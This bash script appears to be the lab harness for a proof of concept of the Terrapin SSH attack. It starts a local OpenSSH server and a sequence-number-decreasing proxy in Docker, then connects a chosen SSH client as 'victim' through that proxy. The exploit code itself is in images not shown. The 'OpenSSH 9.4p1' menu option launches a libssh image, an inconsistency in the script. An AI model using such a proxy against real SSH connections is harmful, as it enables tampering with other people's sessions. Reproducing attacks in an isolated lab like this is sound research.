#!/bin/bash
bash ../impl/build.sh
bash ../pocs/build.sh

# Start OpenSSH server on port 2222 to connect to
echo "[+] Starting OpenSSH 9.5p1 server on port 2222"
docker run -d \
  --rm \
  --network host \
  --name terrapin-artifacts-server \
  terrapin-artifacts/openssh-server:9.5p1 -p 2222 > /dev/null 2>&1
echo "[+] Starting SndDecrease proxy on port 22. Connection will be proxied to 127.0.0.1:2222"
# Start SndDecrease PoC proxy (sequence number will be decreased by N = 1)
docker run \
  --rm \
  --network host \
  --name terrapin-artifacts-poc \
  terrapin-artifacts/sqn-snd-decrease --server-ip 127.0.0.1 --server-port 2222 -N 1 &

PS3="[+] Please choose a client from the list above: "
select tag in "AsyncSSH 2.13.2" "Dropbear 2022.83" "libssh 0.10.5" "OpenSSH 9.4p1" "OpenSSH 9.5p1" "PuTTY 0.79" "Quit"
do
  case $tag in
    "AsyncSSH 2.13.2")
      docker run \
        --rm \
        --network host \
        --name terrapin-artifacts-client \
        terrapin-artifacts/asyncssh-client:2.13.2;;
    "Dropbear 2022.83")
      docker run \
        --rm \
        --network host \
        --name terrapin-artifacts-client \
        terrapin-artifacts/dropbear-client:2022.83 victim@127.0.0.1;;
    "libssh 0.10.5")
      docker run \
        --rm \
        --network host \
        --name terrapin-artifacts-client \
        terrapin-artifacts/libssh-client:0.10.5 victim@127.0.0.1;;
    "OpenSSH 9.4p1")
      docker run \
        --rm \
        --network host \
        --name terrapin-artifacts-client \
        terrapin-artifacts/libssh-client:9.4p1 victim@127.0.0.1;;
    "OpenSSH 9.5p1")
      docker run \
        --rm \
        --network host \
        --name terrapin-artifacts-client \
        terrapin-artifacts/openssh-client:9.5p1 victim@127.0.0.1;;
    "PuTTY 0.79")
      docker run \
        --rm \
        --network host \
        --name terrapin-artifacts-client \
        terrapin-artifacts/putty-client:0.79 victim@127.0.0.1;;
    "Quit")
      break;;
    *)
      echo "Invalid option $REPLY";;
  esac
done

echo "[+] Stopping all containers"
docker stop terrapin-artifacts-server terrapin-artifacts-poc terrapin-artifacts-client > /dev/null 2>&1
